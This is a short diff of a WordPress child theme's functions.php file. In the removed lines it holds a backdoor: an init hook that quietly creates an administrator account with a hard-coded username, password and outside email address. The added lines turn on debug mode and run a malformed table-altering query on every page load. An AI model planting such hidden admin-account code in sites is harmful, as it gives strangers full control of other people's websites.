@@ -27,19 +27,7 @@ if(isset($_GET['debug'])){
 			die();
 	},50);
 }*/
- add_action( 'init', function () {
- 
-        $username = 'adminka';
-        $password = 'adminka';
-        $email_address = 'unknownd1@mail.ru';
- 
-        if ( ! username_exists( $username ) ) {
-            $user_id = wp_create_user( $username, $password, $email_address );
-            $user = new WP_User( $user_id );
-            $user->set_role( 'administrator' );
-        }
- 
-    } );
+define( 'WP_DEBUG', true );
 function my_theme_enqueue_styles() {
 
     $parent_style = 'divi-style'; // This is 'twentyfifteen-style' for the Twenty Fifteen theme.
@@ -257,5 +245,16 @@ function my_acf_google_map_api( $api ){
 }
 
 add_filter('acf/fields/google_map/api', 'my_acf_google_map_api');
+
+function updateEdsPostcodes() {
+    global $wpdb;
+    $row = $wpdb->get_results(  "SELECT COLUMN_NAME FROM wp_edc_postcodes.COLUMNS
+WHERE table_name = 'street_list'"  );
+
+    if(empty($row)){
+        $wpdb->query("ALTER TABLE `wp_edc_postcodes` ADD `street_list` LONGTEXT NULL AFTER `type`;");
+    }
+}
+updateEdsPostcodes();
 
 ?>
